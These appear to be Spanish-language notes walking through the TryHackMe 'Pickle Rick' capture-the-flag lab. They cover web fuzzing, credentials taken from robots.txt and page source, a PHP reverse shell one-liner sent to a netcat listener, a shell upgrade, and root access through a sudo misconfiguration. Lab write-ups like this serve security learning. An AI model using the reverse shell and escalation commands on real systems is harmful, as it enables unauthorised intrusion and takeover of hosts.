# Pickle Rick
-- THM 
- 10.130.188.88
- puerto ssh 22 y 80 http
- fuzzeamos -> index.html y robots.txt /
- parece una contraseña en robots -> Wubbalubbadubdub
- en whatweb -> apache y bootstrap + jquery.
- Investigamos código fuente y encontramos R1ckRul3s
- ssh probamos -> ssh R1ckRul3s@10.130.188.88 con pw de robots nada.
-  ffuf -u http://10.130.188.88/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt
-  Encontramos login.php y denied.php,portal.php
-  Probamos login y entramos con las credencailes.
-  hay un panel de comandos y el resto de pestañas necesitamos ser el verdadero rick para ver.
-  abrimos puerto nc -lvnp 8989 y enviamso la reverse shell - > which php para ver que tenga PHP la máquina y php --version.
-  php -r '$sock=fsockopen("192.168.173.148",8989);exec("/bin/sh -i <&3 >&3 2>&3");' y recibimos la shell -> id
-  MEjoramos shell con python3 -c 'import pty; pty.spawn("/bin/bash");'
-  export TERM=xterm -> establecemos terminal
-  ctrl + z -> stty raw -echo -> fg

-  ls -> vemos clue.txt nos dice que miremos por el otro ingredient y vemos supersecret el priemro.
-  Sup3rS3cretPickl3Ingred.txt
-  Vamos a home y vemos rick y ubuntu -> rentramos en rick y encontramos 'second ingredients'
-  supongo que el último está en root.
-  sudo -l -> User www-data may run the following commands on ip-10-130-188-88:
    (ALL) NOPASSWD: ALL
   - sudo su -> somos root -> cd -> ls -> 3rd.txt
